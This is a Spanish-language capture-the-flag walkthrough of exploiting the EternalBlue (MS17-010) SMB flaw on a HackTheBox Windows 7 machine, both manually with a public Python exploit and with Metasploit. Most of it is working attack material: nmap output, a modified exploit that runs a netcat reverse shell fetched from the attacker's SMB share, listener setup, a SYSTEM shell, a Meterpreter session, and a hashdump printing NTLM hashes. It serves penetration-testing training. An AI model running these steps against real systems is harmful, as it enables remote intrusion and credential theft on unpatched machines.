# ETHERNAL BLUE
## Definición
EternalBlue es el nombre de una vulnerabilidad de seguridad informática en el protocolo SMB (Server Message Block) de Microsoft Windows. Fue descubierto en 2017 y se ha utilizado en ataques cibernéticos, como el ataque de ransomware WannaCry que afectó a cientos de miles de computadoras en todo el mundo.
## Explotación Manual
### Enumeración nmap `445`
#### nmap -sCV
```java        
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
File: targeted
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
# Nmap 7.93 scan initiated Fri Feb 24 10:38:42 2023 as: nmap -p135,139,445,49152,49153,49154,49155,49156,49157 -vvv -sCV -oN targeted 10.10.10.40
Nmap scan report for 10.10.10.40
Host is up, received echo-reply ttl 127 (0.21s latency).
Scanned at 2023-02-24 10:38:43 -05 for 75s

PORT      STATE SERVICE      REASON          VERSION
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack ttl 127 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49156/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-02-24T15:39:50
|_  start_date: 2023-02-24T15:28:09
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   210: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 33838/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 12383/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 19006/udp): CLEAN (Timeout)
|   Check 4 (port 34198/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery:
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-02-24T15:39:52+00:00
|_clock-skew: mean: 3s, deviation: 2s, median: 1s
 
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Feb 24 10:39:58 2023 -- 1 IP address (1 host up) scanned in 76.31 seconds
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
#### nmap --script

``` java
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
File: scanVulns
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
# Nmap 7.93 scan initiated Fri Feb 24 10:52:12 2023 as: nmap -p135,139,445 "--script=vuln and safe" -vvvv -oN scanVulns 10.10.10.40
Nmap scan report for 10.10.10.40
Host is up, received echo-reply ttl 127 (0.14s latency).
Scanned at 2023-02-24 10:52:13 -05 for 16s

PORT    STATE SERVICE      REASON
135/tcp open  msrpc        syn-ack ttl 127
139/tcp open  netbios-ssn  syn-ack ttl 127
445/tcp open  microsoft-ds syn-ack ttl 127

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Read data files from: /usr/bin/../share/nmap
# Nmap done at Fri Feb 24 10:52:29 2023 -- 1 IP address (1 host up) scanned in 17.26 seconds
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
### Exploit zzz Github
Una vez identificado el la vulnerabilidad `ethernal-blue`, descargamos el exploit de zzz `https://github.com/worawit/MS17-010.git`, para veririficar el vector de ingreso.

```java
┌──(root㉿kali)-[/home/…/CTF/HTB/blue/content]
└─# git clone https://github.com/worawit/MS17-010.git                                                              
Clonando en 'MS17-010'...
remote: Enumerating objects: 183, done.
remote: Total 183 (delta 0), reused 0 (delta 0), pack-reused 183
Recibiendo objetos: 100% (183/183), 113.61 KiB | 444.00 KiB/s, listo.
Resolviendo deltas: 100% (102/102), listo.
┌──(root㉿kali)-[/home/…/CTF/HTB/blue/content]
└─# cd MS17-010  
┌──(root㉿kali)-[/home/…/HTB/blue/content/MS17-010]
└─# ls    
 shellcode    eternalblue_exploit7.py   eternalchampion_leak.py   eternalromance_leak.py   eternalsynergy_leak.py   mysmb.py         zzz_exploit.py
 BUG.txt      eternalblue_exploit8.py   eternalchampion_poc.py    eternalromance_poc.py    eternalsynergy_poc.py    npp_control.py  
 checker.py   eternalblue_poc.py        eternalchampion_poc2.py   eternalromance_poc2.py   infoleak_uninit.py       README.md       
```
Para verificar si es explotable ejecutamos el exploit `chequer.py`, para verificar la `named` accesibles
```java
┌──(root㉿kali)-[/home/…/HTB/blue/content/MS17-010]
└─# python2 checker.py 10.10.10.40      
Target OS: Windows 7 Professional 7601 Service Pack 1
The target is not patched
=== Testing named pipes ===
spoolss: STATUS_ACCESS_DENIED
samr: STATUS_ACCESS_DENIED
netlogon: STATUS_ACCESS_DENIED
lsarpc: STATUS_ACCESS_DENIED
browser: STATUS_ACCESS_DENIED
```
#### Chequer.py
En la ejecuciòn anterior se puede veriicar que no hay acceso a los named, por lo que se puede verificar agregando el usuariuo `guest` en la variable `USERNAME` del archivo `chequer.py`

#### Antes
```java
'''
Script for
- check target if MS17-010 is patched or not.
- find accessible named pipe
'''
USERNAME = ''
PASSWORD = ''
```
#### Despues
Agregado el usuario `guest`.
```java
'''
Script for
- check target if MS17-010 is patched or not.
- find accessible named pipe
'''
USERNAME = 'guest'
PASSWORD = ''
```
Una vez modificado el archivo se vuelve a ejecutar el archivo `chequer.py`.

```java
┌──(root㉿kali)-[/home/…/HTB/blue/content/MS17-010]
└─# python2 checker.py 10.10.10.40
Target OS: Windows 7 Professional 7601 Service Pack 1
The target is not patched
=== Testing named pipes ===
spoolss: STATUS_OBJECT_NAME_NOT_FOUND
samr: Ok (64 bit)
netlogon: Ok (Bind context 1 rejected: provider_rejection; abstract_syntax_not_supported (this usually means the interface isn't listening on the given endpoint))
lsarpc: Ok (64 bit)
browser: Ok (64 bit)
```
#### zzz.py
En el resultado obtenido vemos que si hay acceso a los names, por lo que el siguiente paso es ejecutar, exploit zzz.py, sim embargo, antes de eso hay que agregar varias modificaciones al archivo para ejecutar une shell reversa; buscar la clase `def smb_pwn(conn, arch):`
#### Antes
```java
USERNAME = ''
PASSWORD = ''
...

def smb_pwn(conn, arch):
    smbConn = conn.get_smbconnection()
    print('creating file c:\\pwned.txt on the target')
    tid2 = smbConn.connectTree('C$')
    fid2 = smbConn.createFile(tid2, '/pwned.txt')
    smbConn.closeFile(tid2, fid2)
    smbConn.disconnectTree(tid2)
    
    #smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
    #service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')
    # Note: there are many methods to get shell over SMB admin session
    # a simple method to get shell (but easily to be detected by AV) is
    # executing binary generated by "msfvenom -f exe-service ..."
```
#### Despues

aqui se muestran los cambios ejecutados en el caso de la clase `def smb_pwn(conn, arch):`, se comentaron unas lineas y se habilito la de ejecución de comandos, en este caso va apuntar a un recurso compartido `nc.exe`, para que ejecute una shell reversa.
```java

 USERNAME = 'guest'
 PASSWORD = ''
...

def smb_pwn(conn, arch):
#   smbConn = conn.get_smbconnection()    
#   print('creating file c:\\pwned.txt on the target')
#   tid2 = smbConn.connectTree('C$')
#   fid2 = smbConn.createFile(tid2, '/pwned.txt')
#   smbConn.closeFile(tid2, fid2)
#   smbConn.disconnectTree(tid2)
    
    #smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
    service_exec(conn, r'cmd /c \\10.10.16.7\smbFolder\nc.exe -e cmd 10.10.16.7 443')
    # Note: there are many methods to get shell over SMB admin session
    # a simple method to get shell (but easily to be detected by AV) is
    # executing binary generated by "msfvenom -f exe-service ..."
```
#### Netcat Windows
El recuso de netcat que se va a compartir lo descargamos desde el link `https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip`, y lo descomprimimos usando `unzip`

```java
┌──(root㉿kali)-[/home/…/CTF/HTB/blue/content]
└─# wget https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip 
--2023-02-24 11:52:48--  https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip
Resolviendo eternallybored.org (eternallybored.org)... 84.255.206.8, 2a01:260:4094:1:42:42:42:42
Conectando con eternallybored.org (eternallybored.org)[84.255.206.8]:443... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 111892 (109K) [application/zip]
Grabando a: «netcat-win32-1.12.zip»
netcat-win32-1.12.zip                          100%[====================================================================================================>] 109,27K   195KB/s    en 0,6s    
2023-02-24 11:52:49 (195 KB/s) - «netcat-win32-1.12.zip» guardado [111892/111892]
--2023-02-24 11:52:49--  http://netcat.zip/
Resolviendo netcat.zip (netcat.zip)... falló: Nombre o servicio desconocido.
wget: no se pudo resolver la dirección del equipo «netcat.zip»
ACABADO --2023-02-24 11:52:50--
Tiempo total de reloj: 1,8s
Descargados: 1 ficheros, 109K en 0,6s (195 KB/s)
```
Descomprimiendo
```ruby
┌──(root㉿kali)-[/home/…/CTF/HTB/blue/content]
└─# mv netcat-win32-1.12.zip netcat.zip            
┌──(root㉿kali)-[/home/…/CTF/HTB/blue/content]
└─# unzip netcat.zip -d netcat 
Archive:  netcat.zip
  inflating: netcat/doexec.c         
  inflating: netcat/getopt.c         
  inflating: netcat/netcat.c         
  inflating: netcat/generic.h        
  inflating: netcat/getopt.h         
  inflating: netcat/hobbit.txt       
  inflating: netcat/license.txt      
  inflating: netcat/readme.txt       
  inflating: netcat/Makefile         
  inflating: netcat/nc.exe           
  inflating: netcat/nc64.exe         
┌──(root㉿kali)-[/home/…/CTF/HTB/blue/content]
└─# ls
 MS17-010   netcat
```
Una vez descomprimido el archivo, copiamos el archivo `netcat/nc64.exe`, en la ruta donde vamos a compartir el recurso que sera comsumido por `zzz.py`, y renombramos el archivo con `nc.exe` como se modifico el archivo `zzz.py`. Para compartir el recurso utilizamos `impacket-smbserver`.

```java
┌──(root㉿kali)-[/home/…/CTF/HTB/blue/content]
└─# cp netcat/nc64.exe nc.exe                        
┌──(root㉿kali)-[/home/…/CTF/HTB/blue/content]
└─# ls
 MS17-010   netcat   nc.exe 
┌──(root㉿kali)-[/home/…/CTF/HTB/blue/content]
└─# impacket-smbserver smbFolder $(pwd) -smb2support 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
### Explotación
Una vez preparado la fase de preración, para llevar a cabo la explotación ejecutamos tres pasos:

#### Necat modo escucha
Ejecuta  `nc`, modo escucha con la herramienta `rlwrap`.
```ruby
┌──(s3cur1ty3c㉿kali)-[~]
└─$ sudo su
[sudo] contraseña para s3cur1ty3c: 
┌──(root㉿kali)-[/home/s3cur1ty3c]
└─# rlwrap nc -nlvp 443          
listening on [any] 443 ...
```
#### Compartir recurso `nc.exe`

```java 
┌──(root㉿kali)-[/home/…/CTF/HTB/blue/content]
└─# impacket-smbserver smbFolder $(pwd) -smb2support 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
### Ejecución de exploit

```java
┌──(root㉿kali)-[/home/…/HTB/blue/content/MS17-010]
└─# python2 zzz_exploit.py 10.10.10.40 samr 
Target OS: Windows 7 Professional 7601 Service Pack 1
Target is 64 bit
Got frag size: 0x10
GROOM_POOL_SIZE: 0x5030
BRIDE_TRANS_SIZE: 0xfa0
CONNECTION: 0xfffffa800396a020
SESSION: 0xfffff8a0087a9de0
FLINK: 0xfffff8a008a67088
InParam: 0xfffff8a008a6115c
MID: 0x4b03
success controlling groom transaction
modify trans1 struct for arbitrary read/write
make this SMB session to be SYSTEM
overwriting session security context
Opening SVCManager on 10.10.10.40.....
Creating service mfoh.....
Starting service mfoh.....
The NETBIOS connection with the remote host timed out.
Removing service mfoh.....
ServiceExec Error on: 10.10.10.40
nca_s_proto_error
Done
```
Una vez ejcutado estos pasos, y si todo fue configurado correctamente se puede evidenciar, que, con `netcat`, genera una shell reversa.
``` ruby
┌──(s3cur1ty3c㉿kali)-[~]
└─$ sudo su
[sudo] contraseña para s3cur1ty3c: 
┌──(root㉿kali)-[/home/s3cur1ty3c]
└─# rlwrap nc -nlvp 443          
listening on [any] 443 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.10.40] 49159
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
C:\Windows\system32>whoami
whoami
nt authority\system
```

## Explotación con metaexploit

En esta ocasión vamos explotar `ethernal blue` con metaexploit, por lo que iniciamos con el sigueinte comando.
```java
┌──(root㉿kali)-[/home/…/CTF/HTB/blue/content]
└─# msfdb init && msfconsole                                                               
[+] Starting database
[+] Creating database user 'msf'
Ingrese la contraseña para el nuevo rol: 
Ingrésela nuevamente: 
                                                  

                                   .,,.                  .
                                .\$$$$$L..,,==aaccaacc%#s$b.       d8,    d8P
                     d8P        #$$$$$$$$$$$$$$$$$$$$$$$$$$$b.    `BP  d888888p
                  d888888P      '7$$$$\""""''^^`` .7$$$|D*"'```         ?88'
  d8bd8b.d8p d8888b ?88' d888b8b            _.os#$|8*"`   d8P       ?8b  88P
  88P`?P'?P d8b_,dP 88P d8P' ?88       .oaS###S*"`       d8P d8888b $whi?88b 88b
 d88  d8 ?8 88b     88b 88b  ,88b .osS$$$$*" ?88,.d88b, d88 d8P' ?88 88P `?8b
d88' d88b 8b`?8888P'`?8b`?88P'.aS$$$$Q*"`    `?88'  ?88 ?88 88b  d88 d88
                          .a#$$$$$$"`          88b  d8P  88b`?8888P'
                       ,s$$$$$$$"`             888888P'   88n      _.,,,ass;:
                    .a$$$$$$$P`               d88P'    .,.ass%#S$$$$$$$$$$$$$$'
                 .a$###$$$P`           _.,,-aqsc#SS$$$$$$$$$$$$$$$$$$$$$$$$$$'
              ,a$$###$$P`  _.,-ass#S$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$####SSSS'
           .a$$$$$$$$$$SSS$$$$$$$$$$$$$$$$$$$$$$$$$$$$SS##==--""''^^/$$$$$$'
_______________________________________________________________   ,&$$$$$$'_____
                                                                 ll&&$$$$'
                                                              .;;lll&&&&'
                                                            ...;;lllll&'
                                                          ......;;;llll;;;....
                                                           ` ......;;;;... .  .


       =[ metasploit v6.3.2-dev                           ]
+ -- --=[ 2290 exploits - 1201 auxiliary - 409 post       ]
+ -- --=[ 968 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: You can use help to view all 
available commands
Metasploit Documentation: https://docs.metasploit.com/
```
Una vez ingresado buscamos un exploit para eternalblue `search eternalblue`, el exploit que nos servira para esta etapa será el de `id 0`.

```java
msf6 > search eternalblue
Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution

Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce
```
Una vez listado los exploit con el comando `use`, seleccionamos el exploit que vamos a utilizar en la fase de explotación.


``` ruby
msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > 
```
Para ver la configuraciòn del exploit usamos el comando `show options`.

``` ruby
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target m
                                             achines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machi
                                             nes.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.200.147  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/ms17_010_eternalblue) > 
```
Una listado, tenemos que asignar `set` varios valores obligatorios que utiliza el exploit, como `RHOSTS`

```java
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.40
RHOSTS => 10.10.10.40
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.10.10.40      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target m
                                             achines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machi
                                             nes.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.200.147  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
Exploit target:

   Id  Name
   --  ----
   0   Automatic Target

View the full module info with the info, or info -d command.
```
En el caso de este exploit, se deben extablecer parametros adicionales como `LHOST y LPORT`, que utiliza la carga util para establecer una shell reversa.

```ruby
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.16.7
LHOST => 10.10.16.7
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 443
LPORT => 443
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.10.10.40      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target m
                                             achines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machi
                                             nes.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.16.7       yes       The listen address (an interface may be specified)
   LPORT     443              yes       The listen port
Exploit target:
   Id  Name
   --  ----
   0   Automatic Target
View the full module info with the info, or info -d command.
msf6 exploit(windows/smb/ms17_010_eternalblue) >                                                    
```
Unz vez finalizado la configuración podemos ejecutar la exploación con el comando `run, exploit`, una vez finalizado podremos obtener una conexión con meterpreter.

```ruby
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
                                                                                                                                                                  
[*] Started reverse TCP handler on 10.10.16.7:443                                                                                                                                           
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check                                                                                                                     
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)                                                                
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)                                                                                                                            
[+] 10.10.10.40:445 - The target is vulnerable.                                                                                                                                             
[*] 10.10.10.40:445 - Connecting to target for exploitation.                                                                                                                                
[+] 10.10.10.40:445 - Connection established for exploitation.                                                                                                                              
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply                                                                                                                
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[-] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 17 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Sending stage (200774 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened (10.10.16.7:443 -> 10.10.10.40:49158) at 2023-02-24 12:44:02 -0500
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > 
```
Una vez ganado el acceso podemos ejecutar varios comandos.


```java
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cdf51b162460b7d5bc898f493751a0cc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
haris:1000:aad3b435b51404eeaad3b435b51404ee:8002bc89de91f6b52d518bde69202dc6:::
meterpreter > shell
Process 2952 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>

```